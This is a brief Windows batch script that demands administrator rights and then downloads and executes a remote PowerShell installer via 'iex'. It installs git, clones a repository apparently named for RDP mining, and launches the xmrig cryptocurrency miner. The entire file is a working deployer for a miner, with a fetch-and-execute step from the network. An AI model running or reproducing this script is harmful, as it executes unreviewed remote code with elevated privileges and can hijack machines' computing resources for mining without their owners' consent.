@echo off

net session >nul 2>&1

if %ERRORLEVEL% equ 0 (
  echo processing....
  @powershell -NoProfile -ExecutionPolicy unrestricted -Command "iex ((new-object net.webclient).DownloadString('https://chocolatey.org/install.ps1'))" && SET PATH=%PATH%;%systemdrive%\chocolatey\bin
  cinst git
  git clone https://github.com/Sueqkjs/rdprig
  cd rdprig
  xmrig.exe
) else (
  echo kanrisya de zikkou siro
)

pause
